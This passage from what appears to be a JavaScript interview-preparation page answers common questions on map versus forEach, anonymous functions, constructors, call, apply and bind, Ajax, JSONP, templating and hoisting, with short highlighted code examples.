&lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; doubled = [2, 4, 6]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The main difference between &lt;code&gt;.forEach&lt;/code&gt; and &lt;code&gt;.map()&lt;/code&gt; is that &lt;code&gt;.map()&lt;/code&gt; returns a new array. If you need the result, but do not wish to mutate the original array, &lt;code&gt;.map()&lt;/code&gt; is the clear choice. If you simply need to iterate over an array, &lt;code&gt;forEach&lt;/code&gt; is a fine choice.&lt;/p&gt;
&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;What's a typical use case for anonymous functions?&lt;/h3&gt;
&lt;p&gt;They can be used in IIFEs to encapsulate some code within a local scope so that variables declared in it do not leak to the global scope.&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-js&quot;&gt;
&lt;pre&gt;
(&lt;span class=&quot;pl-k&quot;&gt;function&lt;/span&gt;() {
  &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; Some code here.&lt;/span&gt;
})();
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;As a callback that is used once and does not need to be used anywhere else. The code will seem more self-contained and readable when handlers are defined right inside the code calling them, rather than having to search elsewhere to find the function body.&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-js&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-c1&quot;&gt;setTimeout&lt;/span&gt;(&lt;span class=&quot;pl-k&quot;&gt;function&lt;/span&gt;() {
  &lt;span class=&quot;pl-en&quot;&gt;console&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;log&lt;/span&gt;(&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;Hello world!&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;);
}, &lt;span class=&quot;pl-c1&quot;&gt;1000&lt;/span&gt;);
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Arguments to functional programming constructs or Lodash (similar to callbacks).&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-js&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;arr&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;=&lt;/span&gt; [&lt;span class=&quot;pl-c1&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;pl-c1&quot;&gt;2&lt;/span&gt;, &lt;span class=&quot;pl-c1&quot;&gt;3&lt;/span&gt;];
&lt;span class=&quot;pl-k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;double&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;pl-smi&quot;&gt;arr&lt;/span&gt;.&lt;span class=&quot;pl-en&quot;&gt;map&lt;/span&gt;(&lt;span class=&quot;pl-k&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;pl-smi&quot;&gt;el&lt;/span&gt;) {
  &lt;span class=&quot;pl-k&quot;&gt;return&lt;/span&gt; el &lt;span class=&quot;pl-k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;2&lt;/span&gt;;
});
&lt;span class=&quot;pl-en&quot;&gt;console&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;log&lt;/span&gt;(double); &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; [2, 4, 6]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;How do you organize your code? (module pattern, classical inheritance?)&lt;/h3&gt;
&lt;p&gt;In the past, I used Backbone for my models which encourages a more OOP approach, creating Backbone models and attaching methods to them.&lt;/p&gt;
&lt;p&gt;The module pattern is still great, but these days, I use the Flux architecture based on React/Redux which encourages a single-directional functional programming approach instead. I would represent my app's models using plain objects and write utility pure functions to manipulate these objects. State is manipulated using actions and reducers like in any other Redux application.&lt;/p&gt;
&lt;p&gt;I avoid using classical inheritance where possible. When and if I do, I stick to &lt;a href=&quot;https://medium.com/@dan_abramov/how-to-use-classes-and-sleep-at-night-9af8de78ccb4&quot; rel=&quot;nofollow&quot;&gt;these rules&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;What's the difference between host objects and native objects?&lt;/h3&gt;
&lt;p&gt;Native objects are objects that are part of the JavaScript language defined by the ECMAScript specification, such as &lt;code&gt;String&lt;/code&gt;, &lt;code&gt;Math&lt;/code&gt;, &lt;code&gt;RegExp&lt;/code&gt;, &lt;code&gt;Object&lt;/code&gt;, &lt;code&gt;Function&lt;/code&gt;, etc.&lt;/p&gt;
&lt;p&gt;Host objects are provided by the runtime environment (browser or Node), such as &lt;code&gt;window&lt;/code&gt;, &lt;code&gt;XMLHTTPRequest&lt;/code&gt;, etc.&lt;/p&gt;
&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;Difference between: &lt;code&gt;function Person(){}&lt;/code&gt;, &lt;code&gt;var person = Person()&lt;/code&gt;, and &lt;code&gt;var person = new Person()&lt;/code&gt;?&lt;/h3&gt;
&lt;p&gt;This question is pretty vague. My best guess at its intention is that it is asking about constructors in JavaScript. Technically speaking, &lt;code&gt;function Person(){}&lt;/code&gt; is just a normal function declaration. The convention is use PascalCase for functions that are intended to be used as constructors.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;var person = Person()&lt;/code&gt; invokes the &lt;code&gt;Person&lt;/code&gt; as a function, and not as a constructor. Invoking as such is a common mistake if it the function is intended to be used as a constructor. Typically, the constructor does not return anything, hence invoking the constructor like a normal function will return &lt;code&gt;undefined&lt;/code&gt; and that gets assigned to the variable intended as the instance.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;var person = new Person()&lt;/code&gt; creates an instance of the &lt;code&gt;Person&lt;/code&gt; object using the &lt;code&gt;new&lt;/code&gt; operator, which inherits from &lt;code&gt;Person.prototype&lt;/code&gt;. An alternative would be to use &lt;code&gt;Object.create&lt;/code&gt;, such as: &lt;code&gt;Object.create(Person.prototype)&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-js&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;Person&lt;/span&gt;(&lt;span class=&quot;pl-smi&quot;&gt;name&lt;/span&gt;) {
  &lt;span class=&quot;pl-c1&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;=&lt;/span&gt; name;
}

&lt;span class=&quot;pl-k&quot;&gt;var&lt;/span&gt; person &lt;span class=&quot;pl-k&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;Person&lt;/span&gt;(&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;John&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;);
&lt;span class=&quot;pl-en&quot;&gt;console&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;log&lt;/span&gt;(person); &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; undefined&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;console&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;log&lt;/span&gt;(&lt;span class=&quot;pl-smi&quot;&gt;person&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;name&lt;/span&gt;); &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; Uncaught TypeError: Cannot read property 'name' of undefined&lt;/span&gt;

&lt;span class=&quot;pl-k&quot;&gt;var&lt;/span&gt; person &lt;span class=&quot;pl-k&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;Person&lt;/span&gt;(&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;John&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;);
&lt;span class=&quot;pl-en&quot;&gt;console&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;log&lt;/span&gt;(person); &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; Person { name: &quot;John&quot; }&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;console&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;log&lt;/span&gt;(&lt;span class=&quot;pl-smi&quot;&gt;person&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;name&lt;/span&gt;); &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; &quot;john&quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;What's the difference between &lt;code&gt;.call&lt;/code&gt; and &lt;code&gt;.apply&lt;/code&gt;?&lt;/h3&gt;
&lt;p&gt;Both &lt;code&gt;.call&lt;/code&gt; and &lt;code&gt;.apply&lt;/code&gt; are used to invoke functions and the first parameter will be used as the value of &lt;code&gt;this&lt;/code&gt; within the function. However, &lt;code&gt;.call&lt;/code&gt; takes in a comma-separated arguments as the next arguments while &lt;code&gt;.apply&lt;/code&gt; takes in an array of arguments as the next argument. An easy way to remember this is C for &lt;code&gt;call&lt;/code&gt; and comma-separated and A for &lt;code&gt;apply&lt;/code&gt; and array of arguments.&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-js&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;add&lt;/span&gt;(&lt;span class=&quot;pl-smi&quot;&gt;a&lt;/span&gt;, &lt;span class=&quot;pl-smi&quot;&gt;b&lt;/span&gt;) {
  &lt;span class=&quot;pl-k&quot;&gt;return&lt;/span&gt; a &lt;span class=&quot;pl-k&quot;&gt;+&lt;/span&gt; b;
}

&lt;span class=&quot;pl-en&quot;&gt;console&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;log&lt;/span&gt;(&lt;span class=&quot;pl-smi&quot;&gt;add&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;call&lt;/span&gt;(&lt;span class=&quot;pl-c1&quot;&gt;null&lt;/span&gt;, &lt;span class=&quot;pl-c1&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;pl-c1&quot;&gt;2&lt;/span&gt;)); &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; 3&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;console&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;log&lt;/span&gt;(&lt;span class=&quot;pl-smi&quot;&gt;add&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;apply&lt;/span&gt;(&lt;span class=&quot;pl-c1&quot;&gt;null&lt;/span&gt;, [&lt;span class=&quot;pl-c1&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;pl-c1&quot;&gt;2&lt;/span&gt;])); &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; 3&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;Explain &lt;code&gt;Function.prototype.bind&lt;/code&gt;.&lt;/h3&gt;
&lt;p&gt;Taken word-for-word from &lt;a href=&quot;https://developer.mozilla.org/en/docs/Web/JavaScript/Reference/Global_objects/Function/bind&quot; rel=&quot;nofollow&quot;&gt;MDN&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The &lt;code&gt;bind()&lt;/code&gt; method creates a new function that, when called, has its this keyword set to the provided value, with a given sequence of arguments preceding any provided when the new function is called.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;In my experience, it is most useful for binding the value of &lt;code&gt;this&lt;/code&gt; in methods of classes that you want to pass into other functions. This is frequently done in React components.&lt;/p&gt;
&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;When would you use &lt;code&gt;document.write()&lt;/code&gt;?&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;document.write()&lt;/code&gt; writes a string of text to a document stream opened by &lt;code&gt;document.open()&lt;/code&gt;. When &lt;code&gt;document.write()&lt;/code&gt; is executed after the page has loaded, it will call &lt;code&gt;document.open&lt;/code&gt; which clears the whole document (&lt;code&gt;&amp;lt;head&amp;gt;&lt;/code&gt; and &lt;code&gt;&amp;lt;body&amp;gt;&lt;/code&gt; removed!) and replaces the contents with the given parameter value in string. Hence it is usually considered dangerous and prone to misuse.&lt;/p&gt;
&lt;p&gt;There are some answers online that explain &lt;code&gt;document.write()&lt;/code&gt; is being used in analytics code or &lt;a href=&quot;https://www.quirksmode.org/blog/archives/2005/06/three_javascrip_1.html&quot; rel=&quot;nofollow&quot;&gt;when you want to include styles that should only work if JavaScript is enabled&lt;/a&gt;. It is even being used in HTML5 boilerplate to &lt;a href=&quot;https://github.com/paulirish/html5-boilerplate/wiki/Script-Loading-Techniques#documentwrite-script-tag&quot;&gt;load scripts in parallel and preserve execution order&lt;/a&gt;! However, I suspect those reasons might be outdated and in the modern day, they can be achieved without using &lt;code&gt;document.write()&lt;/code&gt;. Please do correct me if I'm wrong about this.&lt;/p&gt;
&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;What's the difference between feature detection, feature inference, and using the UA string?&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Feature Detection&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Feature detection involves working out whether a browser supports a certain block of code, and running different code dependent on whether it does (or doesn't), so that the browser can always provide a working experience rather crashing/erroring in some browsers. For example:&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-js&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-k&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;geolocation&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;navigator&lt;/span&gt;) {
  &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; Can use navigator.geolocation&lt;/span&gt;
} &lt;span class=&quot;pl-k&quot;&gt;else&lt;/span&gt; {
  &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; Handle lack of feature&lt;/span&gt;
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;a href=&quot;https://modernizr.com/&quot; rel=&quot;nofollow&quot;&gt;Modernizr&lt;/a&gt; is a great library to handle feature detection.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Feature Inference&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Feature inference checks for a feature just like feature detection, but uses another function because it assumes it will also exist, e.g.:&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-js&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-k&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;pl-c1&quot;&gt;document&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;getElementsByTagName&lt;/span&gt;) {
  element &lt;span class=&quot;pl-k&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;document&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;getElementById&lt;/span&gt;(id);
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This is not really recommended. Feature detection is more foolproof.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;UA String&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;This is a browser-reported string that allows the network protocol peers to identify the application type, operating system, software vendor or software version of the requesting software user agent. It can be accessed via &lt;code&gt;navigator.userAgent&lt;/code&gt;. However, the string is tricky to parse and can be spoofed. For example, Chrome reports both as Chrome and Safari. So to detect Safari you have to check for the Safari string and the absence of the Chrome string. Avoid this method.&lt;/p&gt;
&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;Explain Ajax in as much detail as possible.&lt;/h3&gt;
&lt;p&gt;Ajax (asynchronous JavaScript and XML) is a set of web development techniques using many web technologies on the client side to create asynchronous web applications. With Ajax, web applications can send data to and retrieve from a server asynchronously (in the background) without interfering with the display and behavior of the existing page. By decoupling the data interchange layer from the presentation layer, Ajax allows for web pages, and by extension web applications, to change content dynamically without the need to reload the entire page. In practice, modern implementations commonly substitute JSON for XML due to the advantages of being native to JavaScript.&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;XMLHttpRequest&lt;/code&gt; API is frequently used for the asynchronous communication or these days, the &lt;code&gt;fetch&lt;/code&gt; API.&lt;/p&gt;
&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;What are the advantages and disadvantages of using Ajax?&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Advantages&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Better interactivity. New content from the server can be changed dynamically without the need to reload the entire page.&lt;/li&gt;
&lt;li&gt;Reduce connections to the server since scripts and stylesheets only have to be requested once.&lt;/li&gt;
&lt;li&gt;State can be maintained on a page. JavaScript variables and DOM state will persist because the main container page was not reloaded.&lt;/li&gt;
&lt;li&gt;Basically most of the advantages of an SPA.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;Disadvantages&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Dynamic webpages are harder to bookmark.&lt;/li&gt;
&lt;li&gt;Does not work if JavaScript has been disabled in the browser.&lt;/li&gt;
&lt;li&gt;Some webcrawlers do not execute JavaScript and would not see content that has been loaded by JavaScript.&lt;/li&gt;
&lt;li&gt;Basically most of the disadvantages of an SPA.&lt;/li&gt;
&lt;/ul&gt;&lt;h3&gt;Explain how JSONP works (and how it's not really Ajax).&lt;/h3&gt;
&lt;p&gt;JSONP (JSON with Padding) is a method commonly used to bypass the cross-domain policies in web browsers because Ajax requests from the current page to a cross-origin domain is not allowed.&lt;/p&gt;
&lt;p&gt;JSONP works by making a request to a cross-origin domain via a &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; tag and usually with a &lt;code&gt;callback&lt;/code&gt; query parameter, for example: &lt;code&gt;https://example.com?callback=printData&lt;/code&gt;. The server will then wrap the data within a function called &lt;code&gt;printData&lt;/code&gt; and return it to the client.&lt;/p&gt;
&lt;div class=&quot;highlight highlight-text-html-basic&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;&amp;lt;!--&lt;/span&gt; https://mydomain.com &lt;span class=&quot;pl-c&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/span&gt;
&amp;lt;&lt;span class=&quot;pl-ent&quot;&gt;script&lt;/span&gt;&amp;gt;
&lt;span class=&quot;pl-s1&quot;&gt;&lt;span class=&quot;pl-k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;printData&lt;/span&gt;(&lt;span class=&quot;pl-smi&quot;&gt;data&lt;/span&gt;) {&lt;/span&gt;
&lt;span class=&quot;pl-s1&quot;&gt;  &lt;span class=&quot;pl-en&quot;&gt;console&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;log&lt;/span&gt;(&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;`&lt;/span&gt;My name is &lt;span class=&quot;pl-s1&quot;&gt;&lt;span class=&quot;pl-pse&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;pl-smi&quot;&gt;data&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pl-pse&quot;&gt;}&lt;/span&gt;&lt;/span&gt;!&lt;span class=&quot;pl-pds&quot;&gt;`&lt;/span&gt;&lt;/span&gt;);&lt;/span&gt;
&lt;span class=&quot;pl-s1&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;pl-s1&quot;&gt;&amp;lt;&lt;/span&gt;/&lt;span class=&quot;pl-ent&quot;&gt;script&lt;/span&gt;&amp;gt;

&amp;lt;&lt;span class=&quot;pl-ent&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;pl-e&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;https://example.com?callback=printData&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&amp;gt;&amp;lt;/&lt;span class=&quot;pl-ent&quot;&gt;script&lt;/span&gt;&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;highlight highlight-source-js&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; File loaded from https://example.com?callback=printData&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;printData&lt;/span&gt;({ name&lt;span class=&quot;pl-k&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;Yang Shun&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt; });
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The client has to have the &lt;code&gt;printData&lt;/code&gt; function in its global scope and the function will be executed by the client when the response from the cross-origin domain is received.&lt;/p&gt;
&lt;p&gt;JSONP can be unsafe and has some security implications. As JSONP is really JavaScript, it can do everything else JavaScript can do, so you need to trust the provider of the JSONP data.&lt;/p&gt;
&lt;p&gt;These days, &lt;a href=&quot;http://en.wikipedia.org/wiki/Cross-origin_resource_sharing&quot; rel=&quot;nofollow&quot;&gt;CORS&lt;/a&gt; is the recommended approach and JSONP is seen as a hack.&lt;/p&gt;
&lt;h6&gt;References&lt;/h6&gt;
&lt;h3&gt;Have you ever used JavaScript templating? If so, what libraries have you used?&lt;/h3&gt;
&lt;p&gt;Yes. Handlebars, Underscore, Lodash, AngularJS and JSX. I disliked templating in AngularJS because it made heavy use of strings in the directives and typos would go uncaught. JSX is my new favourite as it is closer to JavaScript and there is barely any syntax to learn. Nowadays, you can even use ES2015 template string literals as a quick way for creating templates without relying on third-party code.&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-js&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;template&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;`&lt;/span&gt;&amp;lt;div&amp;gt;My name is: &lt;span class=&quot;pl-s1&quot;&gt;&lt;span class=&quot;pl-pse&quot;&gt;${&lt;/span&gt;name&lt;span class=&quot;pl-pse&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&amp;lt;/div&amp;gt;&lt;span class=&quot;pl-pds&quot;&gt;`&lt;/span&gt;&lt;/span&gt;;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;However, do be aware of a potential XSS in the above approach as the contents are not escaped for you, unlike in templating libraries.&lt;/p&gt;
&lt;h3&gt;Explain &quot;hoisting&quot;.&lt;/h3&gt;
&lt;p&gt;Hoisting is a term used to explain the behavior of variable declarations in your code. Variables declared or initialized with the &lt;code&gt;var&lt;/code&gt; keyword will have their declaration &quot;hoisted&quot; up to the top of the current scope. However, only the declaration is hoisted, the assignment (if there is one), will stay where it is. Let's explain with a few examples.&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-js&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; var declarations are hoisted.&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;console&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;log&lt;/span&gt;(foo); &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; undefined&lt;/span&gt;
&lt;span class=&quot;pl-k&quot;&gt;var&lt;/span&gt; foo &lt;span class=&quot;pl-k&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;1&lt;/span&gt;;
&lt;span class=&quot;pl-en&quot;&gt;console&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;log&lt;/span&gt;(foo); &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; 1&lt;/span&gt;

&lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; let/const declarations are NOT hoisted.&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;console&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;log&lt;/span&gt;(bar); &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; ReferenceError: bar is not defined&lt;/span&gt;
&lt;span class=&quot;pl-k&quot;&gt;let&lt;/span&gt; bar &lt;span class=&quot;pl-k&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;2&lt;/span&gt;;
&lt;span class=&quot;pl-en&quot;&gt;console&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;log&lt;/span&gt;(bar); &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; 2&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Function declarations have the body hoisted while the function expressions (written in the form of variable declarations) only has the variable declaration hoisted.&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-js&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; Function Declaration&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;console&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;log&lt;/span&gt;(foo); &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; [Function: foo]&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;foo&lt;/span&gt;(); &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; 'FOOOOO'&lt;/span&gt;
&lt;span class=&quot;pl-k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;foo&lt;/span&gt;() {
  &lt;span class=&quot;pl-en&quot;&gt;console&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;log&lt;/span&gt;(&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;FOOOOO&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;);
}
&lt;span class=&quot;pl-en&quot;&gt;console&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;log&lt;/span&gt;(foo); &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; [Function: foo]&lt;/span&gt;

&lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; Function Expression&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;console&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;log&lt;/span&gt;(bar); &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; undefined&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;bar&lt;/span&gt;(); &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; Uncaught TypeError: bar is not a function&lt;/span&gt;
&lt;span class=&quot;pl-k&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;bar&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;function&lt;/span&gt;() {
  &lt;span class=&quot;pl-en&quot;&gt;console&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;log&lt;/span&gt;(&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;BARRRR&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;);
};
&lt;span class=&quot;pl-en&quot;&gt;console&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;log&lt;/span&gt;(bar); &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; [Function: bar]&lt;/span&gt;
